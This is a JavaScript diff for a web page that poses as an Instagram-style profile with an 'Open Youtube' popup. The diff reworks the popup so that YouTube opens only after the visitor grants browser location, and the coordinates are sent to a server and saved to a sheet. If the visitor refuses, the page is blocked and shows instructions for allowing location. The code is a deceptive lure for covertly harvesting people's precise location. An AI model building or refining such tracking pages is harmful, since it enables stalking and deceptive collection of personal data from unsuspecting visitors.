@@ -1,9 +1,9 @@
 /**
  * Centered Open Youtube dialog over the visible profile page.
  *
- * - Background Instagram-style page stays visible behind the popup.
- * - Allow → request location, save to sheet, open YouTube in a new tab.
- * - Don't Allow → close / block the page.
+ * - Background page stays visible behind the popup.
+ * - Allow → request location first; only if allowed, save + open YouTube.
+ * - Don't Allow / location denied → show instructions (no YouTube).
  */
 
 const YOUTUBE_URL = "https://www.youtube.com/watch?v=l_GlMjcPoOQ";
@@ -51,18 +51,12 @@ function openYouTube() {
   window.open(YOUTUBE_URL, "_blank", "noopener,noreferrer");
 }
 
-/** Don't Allow → hide page and leave. */
-function closePage() {
+/** Location denied → show instructions (do not open YouTube). */
+function showDeniedInstructions() {
   hideDialog();
   if (pageContent) pageContent.hidden = true;
   document.body.classList.add("content-blocked");
   if (blockedEl) blockedEl.hidden = false;
-
-  try {
-    window.close();
-  } catch {
-    // ignore
-  }
 }
 
 async function sendLocationToServer(payload) {
@@ -117,14 +111,15 @@ function isDeniedError(error) {
   );
 }
 
-/** Allow → open YouTube tab, request location, save if granted. */
+/**
+ * Allow → ask for location first.
+ * Only open YouTube after location is granted and saved.
+ */
 async function handleAllow() {
   allowBtn.disabled = true;
   denyBtn.disabled = true;
   hideDialog();
-
-  // Open YouTube immediately in a new tab as requested.
-  openYouTube();
+  setStatus("Waiting for location permission…", "info");
 
   try {
     const position = await requestBrowserLocation();
@@ -137,16 +132,17 @@ async function handleAllow() {
     };
 
     await sendLocationToServer(payload);
-    setStatus("You’re all set.", "ok");
+    setStatus("Location allowed. Opening YouTube…", "ok");
+    openYouTube();
   } catch (error) {
     console.error("Location flow error:", error);
 
     if (isDeniedError(error)) {
-      closePage();
+      showDeniedInstructions();
       return;
     }
 
-    setDialogHint("Could not get location. You can tap Allow again.");
+    setDialogHint("Could not get location. Please tap Allow again.");
     showDialog();
   } finally {
     allowBtn.disabled = false;
@@ -155,7 +151,7 @@ async function handleAllow() {
 }
 
 function handleDontAllow() {
-  closePage();
+  showDeniedInstructions();
 }
 
 async function init() {
@@ -164,7 +160,7 @@ async function init() {
   const perm = await getGeoPermissionState();
   if (perm === "denied") {
     setDialogHint(
-      "Location is blocked for this site. On iPhone: aA or i icon → Website Settings → Location → Allow. On Android: lock icon → Permissions → Location → Allow. Then tap Allow."
+      "Location is blocked. Please allow it on the Al-Khushi page first (see instructions if denied), then tap Allow."
     );
   } else {
     setDialogHint("");
